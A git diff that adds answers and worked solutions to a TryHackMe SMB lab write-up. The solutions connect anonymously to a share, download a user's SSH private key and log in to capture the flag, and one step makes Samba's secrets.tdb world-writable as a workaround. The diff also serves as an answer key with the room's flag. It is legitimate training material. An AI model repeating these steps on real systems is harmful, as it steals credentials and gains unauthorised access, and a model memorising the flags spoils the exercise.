@@ -111,8 +111,8 @@ The first step of enumeration is to conduct a port scan, to find out as
 much information as you can about the services, applications,
 structure and operating system of the target machine.
 
-If you haven't already looked at port scanning, I recommend checking out the Nmap room
-[here](https://tryhackme.com/room/furthernmap).
+If you haven't already looked at port scanning, I recommend checking out the
+[Nmap room here](https://tryhackme.com/room/furthernmap).
 
 ### Enum4Linux
 
@@ -381,13 +381,15 @@ What operating system **version** is running?
 
 What share sticks out as something we might want to investigate?
 
-***Correct answer:***
+***Correct answer: profiles***
 
 ## Task 4: Exploiting SMB
 
 ### Types of SMB Exploit
 
-While there are vulnerabilities such as CVE-2017-7494 that can allow remote code
+While there are vulnerabilities such as
+[CVE-2017-7494](https://www.cvedetails.com/cve/CVE-2017-7494/)
+that can allow remote code
 execution by exploiting SMB, you're more likely to encounter a situation where the best
 way into a system is due to misconfigurations in the system. In this case, we're going to
 be exploiting anonymous SMB share access- a common misconfiguration that can allow us to
@@ -427,7 +429,7 @@ Got it? Okay, let's do this!
 What would be the correct syntax to access an SMB share called "secret"
 as user "suit" on a machine with the IP 10.10.10.2 on the default port?
 
-***Correct answer:***
+***Correct answer: smbclient //10.10.10.2/secret -U suit -P 445***
 
 Great! Now you've got a hang of the syntax, let's have a go at trying to
 exploit this vulnerability. You have a list of users,
@@ -444,25 +446,92 @@ i.e. it doesn't require authentication to view the files. We can do this easily 
 
 Does the share allow anonymous access? Y/N?
 
+*Solution:* I had some problems with Samba.
+
+I had to change permissions of `/var/lib/samba/private/secrets.tdb` with:
+
+```bash
+sudo chmod a+rwx /var/lib/samba/private/secrets.tdb
+```
+
+Then it complained that `secrets.ldb` is missing, so I copied it:
+
+```bash
+sudo cp /var/lib/samba/private/secrets.tdb /var/lib/samba/private/secrets.ldb
+```
+
+Then use the following syntax, and use `ls` to look around:
+
+```bash
+❯ export ip=10.10.12.218
+❯ smbclient //$ip/profiles -U Anonymous # do not add the -P 445 here! Does not work.
+smb: \> ls
+  .                                   D        0  Tue Apr 21 14:08:23 2020
+  ..                                  D        0  Tue Apr 21 13:49:56 2020
+  .cache                             DH        0  Tue Apr 21 14:08:23 2020
+  .profile                            H      807  Tue Apr 21 14:08:23 2020
+  .sudo_as_admin_successful           H        0  Tue Apr 21 14:08:23 2020
+  .bash_logout                        H      220  Tue Apr 21 14:08:23 2020
+  .viminfo                            H      947  Tue Apr 21 14:08:23 2020
+  Working From Home Information.txt      N      358  Tue Apr 21 14:08:23 2020
+  .ssh                               DH        0  Tue Apr 21 14:08:23 2020
+  .bashrc                             H     3771  Tue Apr 21 14:08:23 2020
+  .gnupg                             DH        0  Tue Apr 21 14:08:23 2020
+
+    12316808 blocks of size 1024. 7584052 blocks available
+```
+
 ***Correct answer: Y***
 
 Great! Have a look around for any interesting documents that could contain
 valuable information. Who can we assume this profile folder belongs to?
 
-***Correct answer:***
+*Solution:*
+
+```bash
+smb: \> more "Working From Home Information.txt"
+John Cactus,
+
+As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever 
+possible, employees should work from home. As such- your account has now been enabled with ssh
+access to the main server.
+
+If there are any problems, please contact the IT department at it@polointernalcoms.uk
+
+Regards,
+
+James
+Department Manager 
+
+/tmp/smbmore.iqqVTz (END)
+```
+
+***Correct answer: John Cactus***
 
 What service has been configured to allow him to work from home?
 
-***Correct answer:***
+***Correct answer: ssh***
 
 Okay! Now we know this, what directory on the share should we look in?
 
-***Correct answer:***
+***Correct answer: .ssh***
 
 This directory contains authentication keys that allow a user to authenticate
 themselves on, and then access, a server. Which of these keys is most useful to us?
 
-***Correct answer:***
+*Solution:*
+
+```bash
+smb: \> cd .ssh
+smb: \.ssh\> ls
+  .                                   D        0  Tue Apr 21 14:08:23 2020
+  ..                                  D        0  Tue Apr 21 14:08:23 2020
+  id_rsa                              A     1679  Tue Apr 21 14:08:23 2020
+  id_rsa.pub                          N      396  Tue Apr 21 14:08:23 2020
+  authorized_keys                     N        0  Tue Apr 21 14:08:23 2020
+```
+
+***Correct answer: id_rsa***
 
 Download this file to your local machine, and change the permissions to
 "600" using "`chmod 600 [file]`".
@@ -472,7 +541,59 @@ of the account. Then, use the service and key to log-in to the server.
 
 What is the `smb.txt` flag?
 
-***Correct answer:***
+*Solution:* To find username, look at `id_rsa.pub`
+
+```bash
+smb: \.ssh\> more id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDb7OaL8zLZ5Z8OU3wZPSIQHaoyI8Yc3I/8/Y6faWgYTZbfNPexli0jxdAeTeGy2X3XACWcB4HFejbiNsMYLjy517gwWKPBvN865i8uIQ0Gqayq/KmBHpuBbR0yX/SpyfyvzR3VD16pg/D+WT8hLaNHSYm6FNYLsmVnWDSJDBhS179czftuoW55mw/OqzWVr5ln9cKeeuXlNV1lqCjBqF3ClzEBvN4JW8GS/riLTeHcXeMIMUTuIpr4XovN/VivIlLqTYy7lHuUh6L2RqAfw5+FSr4QZW1zHCMoS6FooTomq/03EGJCGcp80/fT0e04n+7+PxnmvZQkOwe1A1hUG6C/ cactus@polosmb
+/tmp/smbmore.PP9BYc (END)
+```
+
+To log-in, download the private key
+
+```bash
+smb: \.ssh\> get id_rsa
+```
+
+then exit SMB with `exit`.
+
+Then change permissions
+
+```bash
+❯ chmod 600 id_rsa
+```
+
+Then use SSH:
+
+```bash
+❯ ssh cactus@$ip -i id_rsa
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat May 31 09:26:13 UTC 2025
+
+  System load:  0.0                Processes:           95
+  Usage of /:   33.3% of 11.75GB   Users logged in:     0
+  Memory usage: 35%                IP address for ens5: 10.10.12.218
+  Swap usage:   0%
+
+
+22 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Tue Apr 21 11:19:15 2020 from 192.168.1.110
+cactus@polosmb:~$ ls
+smb.txt
+cactus@polosmb:~$ more smb.txt
+THM{smb_is_fun_eh?}
+cactus@polosmb:~$
+```
+
+***Correct answer: THM{smb_is_fun_eh?}***
 
 ## Task 5: Understanding Telnet
 
@@ -883,7 +1004,7 @@ Hydra is a very fast online password cracking tool, which can perform rapid dict
 attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS,
 SMB, several databases and much more. Hydra is already installed on the
 AttackBox, however, if you need it on your own attacking machine,
-you can find the GitHub repository [here](https://github.com/vanhauser-thc/thc-hydra).
+you can find the [GitHub repository here](https://github.com/vanhauser-thc/thc-hydra).
 
 The syntax for the command we're going to use to find the passwords is this:
 
